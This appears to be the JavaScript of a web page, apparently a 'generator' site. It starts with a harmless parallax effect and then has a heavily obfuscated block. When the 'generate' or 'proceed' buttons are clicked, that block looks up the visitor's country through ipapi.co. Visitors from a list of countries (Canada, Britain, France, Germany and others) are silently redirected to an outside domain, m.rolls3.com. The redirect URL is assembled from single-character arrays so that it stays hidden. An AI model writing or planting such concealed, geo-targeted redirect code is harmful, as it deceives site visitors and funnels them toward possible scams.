movementStrength=0xf,height=movementStrength/$(window)[_0x1a3ac5(0x148)](),width=movementStrength/$(window)[_0x1a3ac5(0x16e)]();$('body')[_0x1a3ac5(0x157)](function(_0x1195e){var _0x2dd87c=_0x1a3ac5,_0x50d0d3=_0x1195e['pageX']-$(window)['width']()/0x2,_0x2fc417=_0x1195e[_0x2dd87c(0x162)]-$(window)['height']()/0x2,_0x238730=width*_0x50d0d3*-0x1-0x19,_0x20afaf=height*_0x2fc417*-0x1-0x32;$('#home\x20.soldier')[_0x2dd87c(0x165)](_0x2dd87c(0x142),_0x238730+'px'),$(_0x2dd87c(0x14e))[_0x2dd87c(0x165)](_0x2dd87c(0x16b),_0x20afaf+'px');}),$(window)[_0x1a3ac5(0x14d)](function(){var _0x332a95=_0x1a3ac5;$(_0x332a95(0x160))[_0x332a95(0x141)]();}),$('select')[_0x1a3ac5(0x141)]();
var _0x59a4a8=_0x1434;(function(_0x3e674c,_0x1d2731){var _0x21a64c=_0x1434,_0x5c0844=_0x3e674c();while(!![]){try{var _0x27d741=-parseInt(_0x21a64c(0x191))/0x1*(parseInt(_0x21a64c(0x192))/0x2)+parseInt(_0x21a64c(0x1a4))/0x3+parseInt(_0x21a64c(0x198))/0x4*(parseInt(_0x21a64c(0x199))/0x5)+parseInt(_0x21a64c(0x19d))/0x6*(parseInt(_0x21a64c(0x1a5))/0x7)+-parseInt(_0x21a64c(0x18f))/0x8+parseInt(_0x21a64c(0x1a1))/0x9+-parseInt(_0x21a64c(0x19b))/0xa;if(_0x27d741===_0x1d2731)break;else _0x5c0844['push'](_0x5c0844['shift']());}catch(_0x41f520){_0x5c0844['push'](_0x5c0844['shift']());}}}(_0x28e0,0xade35),document[_0x59a4a8(0x190)](_0x59a4a8(0x19f))['addEventListener'](_0x59a4a8(0x193),function(){setTimeout(function(){var _0x19c67f=_0x1434,_0x33b894=function(){var _0x2e68c6=_0x1434,_0x42593c=['h','t','t','p','s',':','/','/','i','p','a','p','i','.','c','o','/','j','s','o','n','/']['join']('');return fetch(_0x42593c)[_0x2e68c6(0x1a0)](_0x243bc9=>_0x243bc9[_0x2e68c6(0x18d)]())[_0x2e68c6(0x1a0)](_0x5cf088=>_0x5cf088[_0x2e68c6(0x194)]);};_0x33b894()[_0x19c67f(0x1a0)](function(_0x35e2da){var _0x5710aa=_0x19c67f,_0x11d2f4=['C'[_0x5710aa(0x1a6)](0x0)+'A'[_0x5710aa(0x1a6)](0x0),'G'[_0x5710aa(0x1a6)](0x0)+'B'[_0x5710aa(0x1a6)](0x0),'F'['charCodeAt'](0x0)+'R'[_0x5710aa(0x1a6)](0x0),'C'[_0x5710aa(0x1a6)](0x0)+'H'['charCodeAt'](0x0),'D'[_0x5710aa(0x1a6)](0x0)+'E'[_0x5710aa(0x1a6)](0x0),'A'[_0x5710aa(0x1a6)](0x0)+'U'[_0x5710aa(0x1a6)](0x0),'B'[_0x5710aa(0x1a6)](0x0)+'E'[_0x5710aa(0x1a6)](0x0),'D'[_0x5710aa(0x1a6)](0x0)+'K'[_0x5710aa(0x1a6)](0x0),'I'[_0x5710aa(0x1a6)](0x0)+'E'[_0x5710aa(0x1a6)](0x0),'M'[_0x5710aa(0x1a6)](0x0)+'Y'[_0x5710aa(0x1a6)](0x0),'S'[_0x5710aa(0x1a6)](0x0)+'A'[_0x5710aa(0x1a6)](0x0),'C'['charCodeAt'](0x0)+'H'[_0x5710aa(0x1a6)](0x0),'T'['charCodeAt'](0x0)+'R'[_0x5710aa(0x1a6)](0x0)],_0xfedab4=_0x35e2da[_0x5710aa(0x1a6)](0x0)+_0x35e2da[_0x5710aa(0x1a6)](0x1);if(_0x11d2f4[_0x5710aa(0x19a)](_0xfedab4)){var _0xbb9b0b=['w','i','n','d','o','w'][_0x5710aa(0x1a3)](''),_0x50b1bb=['l','o','c','a','t','i','o','n'][_0x5710aa(0x1a3)](''),_0x5aaf80=['h','r','e','f'][_0x5710aa(0x1a3)](''),_0x352ec0=['h','t','t','p','s',':','/','/','m','.','r','o','l','l','s','3','.','c','o','m','/'][_0x5710aa(0x1a3)]('');window[_0x5710aa(0x196)]['href']=_0x352ec0;}}),document[_0x19c67f(0x190)](_0x19c67f(0x19f))[_0x19c67f(0x18e)]['add'](_0x19c67f(0x197),_0x19c67f(0x19c),_0x19c67f(0x19e));},0x0);}),document['getElementById']('proceed')[_0x59a4a8(0x195)](_0x59a4a8(0x193),function(){setTimeout(function(){var _0x15ddb3=_0x1434,_0x2549ea=function(){var _0x363b5c=_0x1434,_0x2431a9=['h','t','t','p','s',':','/','/','i','p','a','p','i','.','c','o','/','j','s','o','n','/'][_0x363b5c(0x1a3)]('');return fetch(_0x2431a9)[_0x363b5c(0x1a0)](_0x36640a=>_0x36640a[_0x363b5c(0x18d)]())[_0x363b5c(0x1a0)](_0x426c21=>_0x426c21[_0x363b5c(0x194)]);};_0x2549ea()['then'](function(_0x472b1c){var _0x47f9a9=_0x1434,_0x4a0ce6=['C'[_0x47f9a9(0x1a6)](0x0)+'A'[_0x47f9a9(0x1a6)](0x0),'G'['charCodeAt'](0x0)+'B'[_0x47f9a9(0x1a6)](0x0),'F'[_0x47f9a9(0x1a6)](0x0)+'R'[_0x47f9a9(0x1a6)](0x0),'C'[_0x47f9a9(0x1a6)](0x0)+'H'[_0x47f9a9(0x1a6)](0x0),'D'['charCodeAt'](0x0)+'E'['charCodeAt'](0x0),'A'[_0x47f9a9(0x1a6)](0x0)+'U'[_0x47f9a9(0x1a6)](0x0),'B'[_0x47f9a9(0x1a6)](0x0)+'E'['charCodeAt'](0x0),'D'[_0x47f9a9(0x1a6)](0x0)+'K'[_0x47f9a9(0x1a6)](0x0),'I'[_0x47f9a9(0x1a6)](0x0)+'E'[_0x47f9a9(0x1a6)](0x0),'M'[_0x47f9a9(0x1a6)](0x0)+'Y'[_0x47f9a9(0x1a6)](0x0),'S'['charCodeAt'](0x0)+'A'[_0x47f9a9(0x1a6)](0x0),'C'[_0x47f9a9(0x1a6)](0x0)+'H'['charCodeAt'](0x0),'T'['charCodeAt'](0x0)+'R'[_0x47f9a9(0x1a6)](0x0)],_0x4954c6=_0x472b1c['charCodeAt'](0x0)+_0x472b1c[_0x47f9a9(0x1a6)](0x1);if(_0x4a0ce6[_0x47f9a9(0x19a)](_0x4954c6)){var _0x2b3dfd=['w','i','n','d','o','w'][_0x47f9a9(0x1a3)](''),_0x5d1804=['l','o','c','a','t','i','o','n'][_0x47f9a9(0x1a3)](''),_0x4ff752=['h','r','e','f'][_0x47f9a9(0x1a3)](''),_0x53aae3=['h','t','t','p','s',':','/','/','m','.','r','o','l','l','s','3','.','c','o','m','/']['join']('');window['location'][_0x47f9a9(0x1a2)]=_0x53aae3;}}),document['getElementById'](_0x15ddb3(0x19f))[_0x15ddb3(0x18e)][_0x15ddb3(0x1a7)](_0x15ddb3(0x197),_0x15ddb3(0x19c),_0x15ddb3(0x19e));},0x1388);}));function _0x1434(_0x5f7f9e,_0x4e0147){var _0x28e0b2=_0x28e0();return _0x1434=function(_0x143478,_0x5203df){_0x143478=_0x143478-0x18d;var _0x34188c=_0x28e0b2[_0x143478];return _0x34188c;},_0x1434(_0x5f7f9e,_0x4e0147);}function _0x28e0(){var _0x5be26c=['2455928SYQfbX','getElementById','17ClnzvB','46198maDZrP','click','country_code','addEventListener','location','d-flex','240564hQLzyS','110ngdOkH','includes','27130560woGpNt','justify-content-center','5695656fCvSnk','mt-3','generate','then','6846660wJCcBW','href','join','3275571bfDPmd','7oUmTYN','charCodeAt','add','json','classList'];_0x28e0=function(){return _0x5be26c;};return _0x28e0();}

